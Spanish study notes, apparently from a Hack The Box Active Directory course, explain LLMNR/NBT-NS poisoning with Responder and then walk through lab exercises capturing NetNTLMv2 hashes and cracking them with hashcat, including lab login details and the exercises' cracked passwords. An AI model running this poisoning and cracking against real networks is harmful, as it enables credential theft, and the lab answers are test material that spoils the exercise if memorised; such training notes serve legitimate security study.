Llegados a este punto hemos completado la enumeración inicial:
Has el momento hemos podido:
- obtener información básica de usuario y grupos.
- enumerar hosts (como el de domain controller)

Vamos a utilizar dos técnicas diferentes en paralelo:
- network poisoning
- password sparying
El objetivo es encontrar credenciales en texto plano para un usuario del dominio.

Esta sección y la siguiente cubrirán una forma común de recopilar credenciales y obtener una base inicial durante una evaluación: 
**un ataque de intermediario (Man-in-the-Middle) contra las transmisiones de Resolución de Nombres de Multidifusión Local de Enlace (LLMNR) y Servicio de Nombres NetBIOS (NBT-NS).** 


### 1. LLMNR (Link-Local Multicast Name Resolution)
LLMNR es el protocolo más moderno (introducido con Windows Vista y Server 2008) y se puede asociar como un **DNS simplificado y local**.
- **Función:** Permite a los _hosts_ en la misma red local o segmento usar la resolución de nombres para identificarse entre sí.
- **Mecanismo:** Cuando un equipo no puede resolver un nombre a través del DNS estándar (por ejemplo, al intentar acceder a `\\ServidorArchivos` y DNS no responde), el equipo envía una **consulta de multidifusión** a una dirección IP de grupo específica.
- **Audiencia:** Solo los _hosts_ que estén en el mismo enlace o segmento de red reciben la consulta.

### 2. NBT-NS (NetBIOS Name Service)

NBT-NS es el protocolo más antiguo, parte de la _suite_ **NetBIOS** que se utiliza principalmente en sistemas heredados.
- **Función:** Se utiliza para identificar activos a través de sus **nombres NetBIOS** (nombres de red cortos heredados de las primeras versiones de Windows).
	NetBIOS (Network Basic Input/Output System) es una API (Interfaz de Programación de Aplicaciones) y un protocolo que fue fundamental para las redes de área local (LAN) de Windows desde los años 80 y 90.El Nombre NetBIOS era el identificador principal en estas redes. Funcionaba como una especie de alias o sobrenombre para que las máquinas pudieran encontrarse y comunicarse localmente.
- **Mecanismo:** Cuando falla la resolución por DNS o WINS, el equipo envía una **consulta de difusión (_broadcast_)** a **toda la subred**.
- **Audiencia:** Todos los _hosts_ en el dominio de difusión (_broadcast domain_) reciben la consulta.
---

## Manual básico LLMNR & NBT-NS
La resolución de nombres de multidifusión local de enlace (LLMNR) y el servicio de nombres NetBIOS (NBT-NS) son componentes de Microsoft Windows que sirven como métodos alternativos de identificación de host cuando falla el DNS. Si un equipo intenta resolver un host, pero la resolución DNS falla, normalmente intentará consultar a todos los demás equipos de la red local para obtener la dirección correcta mediante LLMNR. LLMNR se basa en el formato del Sistema de Nombres de Dominio (DNS) y permite que los hosts en el mismo enlace local resuelvan nombres para otros hosts. Utiliza el puerto 5355 sobre UDP de forma nativa. Si LLMNR falla, se utilizará NBT-NS. NBT-NS identifica los sistemas en una red local por su nombre NetBIOS. NBT-NS utiliza el puerto 137 sobre UDP.

**IMPORTANTE: El problema es que, cuando se utilizan LLMNR/NBT-NS para la resolución de nombres, cualquier host de la red puede responder.**

Aquí es donde entra en juego Responder para bloquear estas solicitudes. Con acceso a la red, podemos suplantar una fuente autorizada de resolución de nombres (en este caso, un host que se supone pertenece al segmento de red) en el dominio de difusión, respondiendo al tráfico LLMNR y NBT-NS como si tuvieran una respuesta para el host solicitante. Este ataque de envenenamiento se realiza para que las víctimas se comuniquen con nuestro sistema, simulando que nuestro sistema malicioso conoce la ubicación del host solicitado. 

**Si el host solicitado requiere resolución de nombres o autenticación, podemos capturar el hash NetNTLM y someterlo a un ataque de fuerza bruta sin conexión para intentar obtener la contraseña en texto plano. **

La solicitud de autenticación capturada también se puede reenviar para acceder a otro host o utilizarse contra un protocolo diferente (como LDAP) en el mismo host. La suplantación de LLMNR/NBNS, combinada con la falta de firma SMB, a menudo puede conducir a acceso administrativo en hosts dentro de un dominio. Los ataques de retransmisión SMB se tratarán en un módulo posterior sobre movimiento lateral.

---

### Caso práctico - LLMNR/NBT-NS POISONING
Escenario:
- Un host intenta conectarse al servidor de impresión en \\\print01.inlanefreight.local, pero por error escribe \\\printer01.inlanefreight.local.
- El servidor DNS responde indicando que este host es desconocido.
- El host entonces envía una solicitud a toda la red local preguntando si alguien conoce la ubicación de \\\printer01.inlanefreight.local.
- El atacante (nosotros con Responder en ejecución) responde al host indicando que se trata de \\\printer01.inlanefreight.local, la dirección que busca.
- El host cree en esta respuesta y envía una solicitud de autenticación al atacante con un nombre de usuario y un hash de contraseña NTLMv2.
- Este hash puede descifrarse sin conexión o utilizarse en un ataque de retransmisión SMB si se dan las condiciones adecuadas.


##### TTP (Técnicas, Técnicas y Procedimientos)
Objetivo: recopilar hashes de contraseña NTLMv1 y NTLMv2:
	NTLMv1 y NTLMv2 son protocolos de autenticación que utilizan el hash LM o NT. 

Posteriormente, intentaremos descifrar el hash sin conexión mediante herramientas como Hashcat o John, con el objetivo de obtener la contraseña en texto plano de la cuenta. 
Esto nos permitirá obtener acceso inicial o ampliar nuestro acceso dentro del dominio si capturamos el hash de contraseña de una cuenta con mayores privilegios que las que ya poseemos.

Existen varias herramientas para intentar el poisoning LLMNR y NBT-NS:
- Responder: Responder es una herramienta diseñada específicamente para envenenar LLMNR, NBT-NS y MDNS, con diversas funciones.
- Inveigh: Inveigh es una plataforma MITM multiplataforma que se puede usar para ataques de suplantación y envenenamiento.
- Metasploit: Metasploit cuenta con varios escáneres y módulos de suplantación integrados para contrarrestar los ataques de envenenamiento.


## POISONING con RESPONDER
En la sección de Enumeración Inicial, utilizamos la herramienta "Responder" en modo de Análisis (pasivo). 
Esto significa que escuchaba las solicitudes de resolución, pero no las respondía ni enviaba paquetes maliciosos. Estábamos solamente escuchando. 
Ahora nos interesa suplantar la identidad:

En responder, el parámetro:
- -A:
	  Modo anàlisis. Escucha pero no actúa. 
	  Permite visualizar peticiones NBT-NS, BROWSER Y LLMNR.
- -w:
	  Activar WPAD en Responder hace que la herramienta responda a las máquinas que buscan automáticamente la configuración de proxy en la red (la llamada búsqueda WPAD/PAC). Muchas máquinas y navegadores (especialmente si tienen “detect proxy automatically” activado) preguntan por WPAD al arrancar o al abrir el navegador. Si Responder responde a esa búsqueda, las máquinas empezarán a usar tu proxy malicioso en lugar del proxy legítimo.
- -f:
	  Responder manda sondas adicionales (peticiones de red no estándar) a los hosts que detecta. Analiza las respuestas y, con eso, intenta identificar el SO y versión del equipo. No es 100% exacto, pero da pistas muy útiles.
- -v:
	  Activa el modo verbose. 
- -F // -P
	  Fuerza al cliente a autenticarse contra tu servidor WPAD falso cuando intenta obtener la configuración de proxy.  

Responder escuchará y responderá a cualquier solicitud que reciba en la red. Si la captura de un hash es exitosa, Responder lo mostrará en pantalla y lo escribirá en un archivo de registro por host, ubicado en el directorio `/usr/share/responder/logs`. Los hashes se guardan en el formato `(NOMBRE_DEL_MÓDULO)-(TIPO_DE_HASH)-(IP_DEL_CLIENTE).txt`, y se imprime un hash en la consola y se almacena en su archivo de registro asociado, a menos que el modo `-v` esté habilitado.

Los hashes también se almacenan en una base de datos SQLite que se puede configurar en el archivo de configuración `Responder.conf`, ubicado normalmente en `/usr/share/responder`, a menos que clonemos el repositorio de Responder directamente desde GitHub.

Debemos ejecutar la herramienta con privilegios de sudo o como root y asegurarnos de que los siguientes puertos estén disponibles en nuestro host de ataque para que funcione correctamente:
```shell-session
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```


#### Responder LOGS:

Si se capturan HASHES, los podremos ver con:

```shell-session
Polika4RM@htb[/htb]$ ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

### Ejecutando el ataque con RESPONDER

Al ejecutar:
```bash
sudo responder -I ens224 
```

Empezará el ataque:

![[responder_hashes.gif]]

**Normalmente, debemos iniciar Responder y dejarlo funcionando un rato en una ventana de tmux mientras realizamos otras tareas de enumeración para maximizar la cantidad de hashes que podemos obtener**

Una vez listos, podemos pasar estos hashes a Hashcat usando el modo hash 5600 para los hashes NTLMv2 que solemos obtener con Responder. 
En ocasiones, podemos obtener hashes NTLMv1 y otros tipos de hashes; para ello, podemos consultar la página de ejemplos de hashes de Hashcat para identificarlos y encontrar el modo hash adecuado:
>https://hashcat.net/wiki/doku.php?id=example_hashes

Una vez que tengamos suficientes hashes, necesitamos convertirlos a un formato que podamos usar de inmediato. Los hashes NetNTLMv2 son muy útiles una vez descifrados, pero no se pueden usar para técnicas como pass-the-hash, lo que significa que debemos intentar descifrarlos sin conexión a internet. Podemos hacerlo con herramientas como Hashcat y John:

### Crackeando con HASHCAT
```shell-session
Polika4RM@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: L0VEABLE -> Kittikat

Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```

Al observar los resultados anteriores, vemos que hemos descifrado el hash NET-NTLMv2 del usuario FOREND, cuya contraseña es Klmcargo2. 

---

**Target(s): 10.129.186.63**
**SSH to 10.129.186.63 with user "htb-student" and password "HTB_@cademy_stdnt!"**
**1. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

Me conecto por RDP:
```
xfreerdp /v:10.129.186.63 /p:HTB_@cademy_stdnt! /u:htb-student
```

Acudo a /etc/hosts, que es donde se ubica la herramienta responder.
La ejecuto con:
```
sudo responder -I ens2
```

Y en un momento dado (después de esperar +5min), encuentro el usuario llamado: "backupagnet":
![[Pasted image 20251030175926.png]]

**2. Crack the hash for the previous account and submit the cleartext password as your answer.**

Accediendo a /usr/share/responder/logs. 

Encuentro el archivo llamado "SMB-NTLMv2-SSP-172.16.5.130.txt" con el siguiente contenido, el cual lo copiamos a un archivo llamado "hash.txt"

```
backupagent::INLANEFREIGHT:28d8acc75492db81:26C317C8BA2B4B6D93DEAA73FEDA3594:01010000000000000094CD2F9C49DC0159DCE207D3AD47B300000000020008003900350055004F0001001E00570049004E002D0045003900570058003800410045004B004F004B00470004003400570049004E002D0045003900570058003800410045004B004F004B0047002E003900350055004F002E004C004F00430041004C00030014003900350055004F002E004C004F00430041004C00050014003900350055004F002E004C004F00430041004C00070008000094CD2F9C49DC01060004000200000008003000300000000000000000000000003000000A2FE39AA1418ADCA08896C50B5F20D16090D12AE8E786765F6332386921B0E40A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Lo crackeamos:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

y nos devuelve:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz  --show
BACKUPAGENT::INLANEFREIGHT:28d8acc75492db81:26c317c8ba2b4b6d93deaa73feda3594:01010000000000000094cd2f9c49dc0159dce207d3ad47b300000000020008003900350055004f0001001e00570049004e002d0045003900570058003800410045004b004f004b00470004003400570049004e002d0045003900570058003800410045004b004f004b0047002e003900350055004f002e004c004f00430041004c00030014003900350055004f002e004c004f00430041004c00050014003900350055004f002e004c004f00430041004c00070008000094cd2f9c49dc01060004000200000008003000300000000000000000000000003000000a2fe39aa1418adca08896c50b5f20d16090d12ae8e786765f6332386921b0e40a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55

```
Respuesta: h1backup55


**3. Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**


En el mismo archivo anterior:
/usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt.

Guardo el contenido del hash en hash2.txt:
```
wley::INLANEFREIGHT:4290ab631af3d5e1:74856145D3BADC33F8284D846054A6CF:01010000000000000094CD2F9C49DC017FCC91C333FC9C3D00000000020008003900350055004F0001001E00570049004E002D0045003900570058003800410045004B004F004B00470004003400570049004E002D0045003900570058003800410045004B004F004B0047002E003900350055004F002E004C004F00430041004C00030014003900350055004F002E004C004F00430041004C00050014003900350055004F002E004C004F00430041004C00070008000094CD2F9C49DC01060004000200000008003000300000000000000000000000003000000A2FE39AA1418ADCA08896C50B5F20D16090D12AE8E786765F6332386921B0E40A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Ejecutamos de nuevo:
```
hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt.gz
```

Respuesta: transporter@4